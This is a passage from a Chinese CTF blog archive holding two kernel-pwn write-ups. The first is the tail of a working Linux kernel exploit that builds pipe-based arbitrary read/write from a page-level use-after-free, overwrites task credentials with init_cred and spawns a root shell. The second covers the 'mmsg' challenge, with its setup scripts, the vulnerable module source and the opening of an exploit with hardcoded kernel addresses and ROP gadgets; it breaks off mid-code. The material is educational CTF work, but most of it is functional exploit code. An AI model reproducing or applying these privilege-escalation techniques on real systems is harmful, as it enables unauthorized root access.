evil_pipe_buf_2.offset = <span class="number">0</span>;</span><br><span class="line">  evil_pipe_buf_2.len = <span class="number">0x1ff8</span>;</span><br><span class="line">  evil_pipe_buf_2.page = page_to_read;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* use 3 wrtite 4 to make 4-&gt;2 */</span></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_3][<span class="number">1</span>], &amp;evil_pipe_buf_4,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf_4));</span><br><span class="line">  <span class="comment">/* use 4 write 2 */</span></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_4][<span class="number">1</span>], &amp;evil_pipe_buf_2,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf_2));</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_4][<span class="number">1</span>], temp_zero_buf,</span><br><span class="line">        TRD_PIPE_BUFS_SIZE - <span class="built_in">sizeof</span>(evil_pipe_buf_2));</span><br><span class="line">  <span class="comment">/* use 4 write 3 */</span></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_4][<span class="number">1</span>], &amp;evil_pipe_buf_3,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf_3));</span><br><span class="line">  <span class="comment">/* read 2 */</span></span><br><span class="line">  <span class="built_in">read</span>(spray_pipe_fd[self_pipe_idx_2][<span class="number">0</span>], dst, <span class="number">0xfff</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pipe_arb_write</span><span class="params">(<span class="keyword">struct</span> page *page_to_write, <span class="type">void</span> *src, <span class="type">size_t</span> len)</span> </span>&#123;</span><br><span class="line">  evil_pipe_buf_2.page = page_to_write;</span><br><span class="line">  evil_pipe_buf_2.offset = <span class="number">0</span>;</span><br><span class="line">  evil_pipe_buf_2.len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* use 3 wrtite 4 to make 4-&gt;2 */</span></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_3][<span class="number">1</span>], &amp;evil_pipe_buf_4,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf_4));</span><br><span class="line">  <span class="comment">/* use 4 write 2 */</span></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_4][<span class="number">1</span>], &amp;evil_pipe_buf_2,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf_2));</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_4][<span class="number">1</span>], temp_zero_buf,</span><br><span class="line">        TRD_PIPE_BUFS_SIZE - <span class="built_in">sizeof</span>(evil_pipe_buf_2));</span><br><span class="line">  <span class="comment">/* use 4 write 3 */</span></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_4][<span class="number">1</span>], &amp;evil_pipe_buf_3,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf_3));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_2][<span class="number">1</span>], src, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> *tsk_buf, current_task_page, current_task, parent_task, buf[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">info_leak</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;info leak&quot;</span>);</span><br><span class="line">  <span class="type">size_t</span> *comm_addr;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="built_in">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;setup kernel arbitrary read &amp; write...&quot;</span>);</span><br><span class="line">  <span class="built_in">setup_evil_pipe</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;leaking something by search memory&quot;</span>);</span><br><span class="line">  vmemmap_base = (<span class="type">size_t</span>)info_pipe_buf.page &amp; <span class="number">0xfffffffff0000000</span>;</span><br><span class="line">  <span class="comment">// log_info(&quot;vmemmap_base: %#lx&quot;, vmemmap_base);</span></span><br><span class="line">  <span class="comment">// debug(&quot;vmemmap_base&quot;);</span></span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="built_in">pipe_arb_read</span>((<span class="keyword">struct</span> page *)(vmemmap_base + <span class="number">157</span> * <span class="number">0x40</span>), buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (buf[<span class="number">0</span>] &gt; <span class="number">0xffffffff81000000</span> &amp;&amp; ((buf[<span class="number">0</span>] &amp; <span class="number">0xfff</span>) == <span class="number">0x070</span>)) &#123;</span><br><span class="line">      kernel_base = buf[<span class="number">0</span>] - <span class="number">0x070</span>;</span><br><span class="line">      kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">      <span class="built_in">printf</span>(</span><br><span class="line">          <span class="string">&quot;Found kernel base: %#lx\n\t\t&quot;</span></span><br><span class="line">          <span class="string">&quot;Kernel offset: %#lx&quot;</span>,</span><br><span class="line">          kernel_base, kernel_offset);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    vmemmap_base -= <span class="number">0x10000000</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;vmemmap_base: %#lx&quot;</span>, vmemmap_base);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;seek task_struct in memory...&quot;</span>);</span><br><span class="line">  <span class="built_in">prctl</span>(PR_SET_NAME, <span class="string">&quot;waterkernelpwn&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; <span class="number">1</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">pipe_arb_read</span>((<span class="keyword">struct</span> page *)(vmemmap_base + i * <span class="number">0x40</span>), buf);</span><br><span class="line"></span><br><span class="line">    comm_addr = <span class="built_in">memmem</span>(buf, <span class="number">0xf00</span>, <span class="string">&quot;waterkernelpwn&quot;</span>, <span class="number">14</span>);</span><br><span class="line">    <span class="keyword">if</span> (comm_addr &amp;&amp; (comm_addr[<span class="number">-2</span>] &gt; <span class="number">0xffff888000000000</span>) <span class="comment">/* task-&gt;cred */</span></span><br><span class="line">        &amp;&amp; (comm_addr[<span class="number">-3</span>] &gt; <span class="number">0xffff888000000000</span>)           <span class="comment">/* task-&gt;real_cred */</span></span><br><span class="line">        &amp;&amp; (comm_addr[<span class="number">-57</span>] &gt; <span class="number">0xffff888000000000</span>)    <span class="comment">/* task-&gt;read_parent */</span></span><br><span class="line">        &amp;&amp; (comm_addr[<span class="number">-56</span>] &gt; <span class="number">0xffff888000000000</span>)) &#123; <span class="comment">/* task-&gt;parent */</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* task-&gt;read_parent */</span></span><br><span class="line">      parent_task = comm_addr[<span class="number">-57</span>];</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* task_struct::ptraced */</span></span><br><span class="line">      current_task = comm_addr[<span class="number">-50</span>] - <span class="number">2528</span>;</span><br><span class="line"></span><br><span class="line">      page_offset_base = (comm_addr[<span class="number">-50</span>] &amp; <span class="number">0xfffffffffffff000</span>) - i * <span class="number">0x1000</span>;</span><br><span class="line">      page_offset_base &amp;= <span class="number">0xfffffffff0000000</span>;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found task_struct on page: \033[0m%p\n&quot;</span>,</span><br><span class="line">             (<span class="keyword">struct</span> page *)(vmemmap_base + i * <span class="number">0x40</span>));</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] page_offset_base: \033[0m%#lx\n&quot;</span>,</span><br><span class="line">             page_offset_base);</span><br><span class="line">      <span class="built_in">printf</span>(</span><br><span class="line">          <span class="string">&quot;\033[34m\033[1m[*] current task_struct&#x27;s addr: \033[0m&quot;</span></span><br><span class="line">          <span class="string">&quot;%#lx\n\n&quot;</span>,</span><br><span class="line">          current_task);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_root_shell</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getuid</span>()) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">sleep</span>(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Execve root shell now...\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">direct_map_addr_to_page_addr</span><span class="params">(<span class="type">size_t</span> direct_map_addr)</span> </span>&#123;</span><br><span class="line">  <span class="type">size_t</span> page_count;</span><br><span class="line"></span><br><span class="line">  page_count = ((direct_map_addr &amp; (~<span class="number">0xfff</span>)) - page_offset_base) / <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> vmemmap_base + page_count * <span class="number">0x40</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">privilege_escalation_by_task_overwrite</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* finding the init_task, the final parent of every task */</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*] Seeking for init_task...&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="type">size_t</span> ptask_page_addr = <span class="built_in">direct_map_addr_to_page_addr</span>(parent_task);</span><br><span class="line"></span><br><span class="line">    tsk_buf = (<span class="type">size_t</span> *)((<span class="type">size_t</span>)buf + (parent_task &amp; <span class="number">0xfff</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">pipe_arb_read</span>((<span class="keyword">struct</span> page *)ptask_page_addr, buf);</span><br><span class="line">    <span class="built_in">pipe_arb_read</span>((<span class="keyword">struct</span> page *)(ptask_page_addr + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* task_struct::real_parent */</span></span><br><span class="line">    <span class="keyword">if</span> (parent_task == tsk_buf[<span class="number">309</span>]) &#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    parent_task = tsk_buf[<span class="number">309</span>];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  init_task = parent_task;</span><br><span class="line">  init_cred = tsk_buf[<span class="number">363</span>];</span><br><span class="line">  init_nsproxy = tsk_buf[<span class="number">377</span>];</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_task: \033[0m0x%lx\n&quot;</span>, init_task);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n&quot;</span>, init_cred);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n&quot;</span>, init_nsproxy);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* now, changing the current task_struct to get the full root :) */</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*] Escalating ROOT privilege now...&quot;</span>);</span><br><span class="line"></span><br><span class="line">  current_task_page = <span class="built_in">direct_map_addr_to_page_addr</span>(current_task);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">pipe_arb_read</span>((<span class="keyword">struct</span> page *)current_task_page, buf);</span><br><span class="line">  <span class="built_in">pipe_arb_read</span>((<span class="keyword">struct</span> page *)(current_task_page + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span>]);</span><br><span class="line"></span><br><span class="line">  tsk_buf = (<span class="type">size_t</span> *)((<span class="type">size_t</span>)buf + (current_task &amp; <span class="number">0xfff</span>));</span><br><span class="line">  tsk_buf[<span class="number">363</span>] = init_cred;</span><br><span class="line">  tsk_buf[<span class="number">364</span>] = init_cred;</span><br><span class="line">  tsk_buf[<span class="number">377</span>] = init_nsproxy;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">pipe_arb_write</span>((<span class="keyword">struct</span> page *)current_task_page, buf, <span class="number">0xff0</span>);</span><br><span class="line">  <span class="built_in">pipe_arb_write</span>((<span class="keyword">struct</span> page *)(current_task_page + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span>], <span class="number">0xff0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] Done.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*] checking for root...&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">get_root_shell</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">bind_core</span><span class="params">(<span class="type">int</span> core)</span> </span>&#123;</span><br><span class="line">  <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">CPU_ZERO</span>(&amp;cpu_set);</span><br><span class="line">  <span class="built_in">CPU_SET</span>(core, &amp;cpu_set);</span><br><span class="line">  <span class="built_in">sched_setaffinity</span>(<span class="built_in">getpid</span>(), <span class="built_in">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">bind_core</span>(<span class="number">0</span>);</span><br><span class="line">  dev_fd = <span class="built_in">open</span>(<span class="string">&quot;/dev/water&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (dev_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;open /dev/water&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">page_level_uaf</span>();</span><br><span class="line">  <span class="built_in">second_page_level_uaf</span>();</span><br><span class="line">  <span class="built_in">construct_self_pipe</span>();</span><br><span class="line">  <span class="built_in">info_leak</span>();</span><br><span class="line">  <span class="built_in">privilege_escalation_by_task_overwrite</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç­‰å“ªå¤©å¿ƒè¡€æ¥æ½®åœ¨åšä¸€éå§</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul>
<li><a href="https://www.52pojie.cn/thread-1795570-1-1.html">Linux kernel å †æº¢å‡ºæ¼æ´åˆ†æä¸åˆ©ç”¨</a></li>
<li><a href="https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/">D^ 3CTF2023 d3kcache å‡ºé¢˜æ‰‹è®° - arttnba3â€™s blog</a></li>
<li><a href="https://blog.xmcve.com/2023/11/12/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812023-Writeup/#title-8">æ˜Ÿç›Ÿï¼šå¼ºç½‘æ‹Ÿæ€2023 Writeup</a></li>
<li><a href="https://mp.weixin.qq.com/s/Ls-PQ3VtVRiKRXwHWTQIwA">DJBï¼š2023å¼ºç½‘æ‹Ÿæ€é¢„èµ› WP</a></li>
<li><a href="https://mp.weixin.qq.com/s/3vaT1gJBagSjovJZNZaR-g">El3ctronicï¼šç¬¬å…­å±Šâ€œå¼ºç½‘â€æ‹Ÿæ€</a></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>peekgeek-mmsg</title>
    <url>/2023/07/28/peekgeek%20mmsg/</url>
    <content><![CDATA[<blockquote>
<p>åšé¢˜è¸©å‘å®å½•ï¼Œèµ›åå¤ç°.</p>
</blockquote>
<span id="more"></span>

<h2 id="step1-init"><a href="#step1-init" class="headerlink" title="step1: init"></a>step1: init</h2><p>æ‹¿åˆ°é™„ä»¶ï¼ŒæŸ¥çœ‹å¯åŠ¨è„šæœ¬ï¼Œsmep, smap, kaslrï¼Œåº”è¯¥è¿˜æœ‰pti</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">        -m 256M \</span><br><span class="line">        -cpu host,+smep,+smap \</span><br><span class="line">        -smp cores=1 \</span><br><span class="line">        -kernel bzImage \</span><br><span class="line">        -hda rootfs.img \</span><br><span class="line">        -nographic \</span><br><span class="line">        -monitor none \</span><br><span class="line">        -snapshot \</span><br><span class="line">        -enable-kvm \</span><br><span class="line">        -append <span class="string">&quot;console=ttyS0 root=/dev/sda rw kaslr rdinit=/sbin/init  quiet oops=panic panic=1&quot;</span> \</span><br><span class="line">        -no-reboot</span><br></pre></td></tr></table></figure>

<p>ext4 é•œåƒæŒ‚è½½</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> rootfs</span><br><span class="line"></span><br><span class="line">sudo mount rootfs.img ./rootfs</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹initï¼Œ etc&#x2F;init.d ä¸‹çš„æ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">chown</span> -R root:root /</span><br><span class="line"><span class="built_in">chmod</span> 700 /root</span><br><span class="line"><span class="built_in">chown</span> -R ctf:ctf /home/ctf</span><br><span class="line"><span class="built_in">chown</span> root:root /root/flag</span><br><span class="line"><span class="built_in">chmod</span> 600 /root/flag</span><br><span class="line"></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t tmpfs tmpfs /tmp</span><br><span class="line"><span class="built_in">mkdir</span> /dev/pts</span><br><span class="line">mount -t devpts devpts /dev/pts</span><br><span class="line"></span><br><span class="line"><span class="comment"># echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span></span><br><span class="line"><span class="comment"># echo 1 &gt; /proc/sys/kernel/kptr_restrict</span></span><br><span class="line"></span><br><span class="line">insmod /root/mmsg.ko</span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/mmsg</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\nBoot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /home/ctf</span><br><span class="line"><span class="comment"># setsid cttyhack su ctf -c /bin/sh</span></span><br><span class="line">setsid cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"><span class="comment"># setsid cttyhack setuidgid 0 /bin/sh</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>


<p>ä¿®æ”¹å†…å®¹ï¼Œå°†koæ–‡ä»¶æ‹·è´ä¸€ä»½ï¼Œetc&#x2F;init.d&#x2F;rcSå†…å®¹ä¿®æ”¹ä¸€ä¸‹ï¼Œç„¶åumountï¼Œå¯åŠ¨ã€‚ï¼ˆä¿®æ”¹æ•ˆæœç”Ÿæ•ˆå¿…é¡»è¦<strong>umount</strong>ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mount ./rootfs</span><br></pre></td></tr></table></figure>

<p>å†…æ ¸ç‰ˆæœ¬ <code>5.10.186</code></p>
<h2 id="step2-ko"><a href="#step2-ko" class="headerlink" title="step2: ko"></a>step2: ko</h2><p>é€†å‘åˆ†ækoæ–‡ä»¶ï¼ˆç›´æ¥ç»™å‡ºäº†cæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥ä¸çœ‹ï¼‰ã€‚æ¼æ´æ‰€åœ¨çš„åœ°æ–¹ï¼Œç±»ä¼¼å…¥é—¨ç»å…¸é¢˜ç›®<a href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/slub/uaf/">kernel UAF - CTF Wiki</a>ã€‚ä½†æ˜¯ç»“æ„ä½“å¤§å°0x20</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">mmsg_head</span> *<span class="title">mmsg_head</span>;</span> </span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">miscdevice</span> <span class="title">mmsg_device</span>;</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">module_close</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span> &#123;</span><br><span class="line">Â  Â  kfree(mmsg_head);</span><br><span class="line">Â  Â  <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">mmsg_module_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"></span><br><span class="line">    mmsg_device.minor = MISC_DYNAMIC_MINOR;</span><br><span class="line">    mmsg_device.name = DEVICE_NAME;</span><br><span class="line">    mmsg_device.fops = &amp;module_fops;</span><br><span class="line">    misc_register(&amp;mmsg_device);</span><br><span class="line">    mmsg_head = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> mmsg_head), GFP_KERNEL);</span><br><span class="line">    <span class="built_in">strncpy</span>(mmsg_head-&gt;description, DEVICE_NAME <span class="string">&quot;-mmsg_head&quot;</span>, <span class="number">15</span>);</span><br><span class="line">    INIT_LIST_HEAD(&amp;mmsg_head-&gt;<span class="built_in">list</span>);</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Hello, World!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">mmsg_module_exit</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    misc_deregister(&amp;mmsg_device);</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Goodbye, World!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="step3-exploit"><a href="#step3-exploit" class="headerlink" title="step3: exploit"></a>step3: exploit</h2><p>å°è¯•ROPï¼Œä½†æ˜¯ä¸å¤ªä¼šğŸ¤¡</p>
<h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>åŸæ–‡å†…å®¹ï¼š <a href="https://n.ova.moe/blog/2023/03/18/_%E5%86%85%E6%A0%B8%E9%A2%98%E7%9B%AE%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95">ã€ŒPWNã€å†…æ ¸ PWN é¢˜ç›®çš„ç¬¬ä¸€æ¬¡å°è¯•</a></p>
<ul>
<li>åƒï¼Œå¾ˆåƒå‘€ã€‚çœ‹äº†ä¸€ä¸‹ï¼Œå‘ç°åŠå…¶ç±»ä¼¼ï¼Œäºæ˜¯å°è¯•ä½¿ç”¨ç±»ä¼¼çš„expè¿›è¡Œåš</li>
<li>è°ƒè¯•ï¼Œæ‰¾åœ°å€ï¼Œå…ˆå…³é—­kaslrï¼Œé€šè¿‡æ³„éœ²è·å¾—offset</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  gcc exp.c -static -o exp</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd1, fd2;</span><br><span class="line"><span class="type">int</span> seq_fd;</span><br><span class="line"><span class="type">size_t</span> buf[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *dev_name = <span class="string">&quot;/dev/mmsg&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// kernel base =&gt;  cat /proc/kallsyms | grep startup_64</span></span><br><span class="line"><span class="type">size_t</span> kernel_base;</span><br><span class="line"><span class="type">size_t</span> kernel_offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">// nokalr kernel base</span></span><br><span class="line"><span class="type">size_t</span> nokaslr = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * cat /sys/module/mmsg/sections/.text</span></span><br><span class="line"><span class="comment"> * 0xffffffffc03f5000</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// close kaslr</span></span><br><span class="line"><span class="comment">// grep prepare_kernel_cred  /proc/kallsyms</span></span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff9248d790</span>;</span><br><span class="line"><span class="comment">// grep commit_creds  /proc/kallsyms</span></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff9248d350</span>;</span><br><span class="line"><span class="comment">// grep swapgs_restore_regs_and_return_to_usermode  /proc/kallsyms</span></span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff93000e30</span>;</span><br><span class="line"><span class="comment">//  grep native_write_cr4 /proc/kallsyms</span></span><br><span class="line"><span class="type">size_t</span> native_write_cr4 = <span class="number">0xffffffffa8832250</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ropper</span></span><br><span class="line"><span class="comment">// pop rdi; ret</span></span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff812274dd</span>;</span><br><span class="line"><span class="comment">// 0xffffffff82d63c0d: mov edi, eax; call rbx;</span></span><br><span class="line"><span class="comment">// åœ¨ 64 ä½ç¯å¢ƒä¸‹ï¼Œç›®çš„å¯„å­˜å™¨è‹¥æ˜¯ 32 ä½ï¼Œåˆ™ä¼šå°†é«˜ 32 ä½æ¸…é›¶</span></span><br><span class="line"><span class="type">size_t</span> mov_edi_eax_call_rbx = <span class="number">0xffffffff82d63c0d</span>;</span><br><span class="line"><span class="comment">// 0xffffffff82e6f708: pop rbx; ret; </span></span><br><span class="line"><span class="type">size_t</span> pop_rbx_ret = <span class="number">0xffffffff82e6f708</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mmsg_arg</span> &#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> token;</span><br><span class="line">  <span class="type">int</span> top;</span><br><span class="line">  <span class="type">int</span> size;</span><br><span class="line">  <span class="type">char</span> *data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> 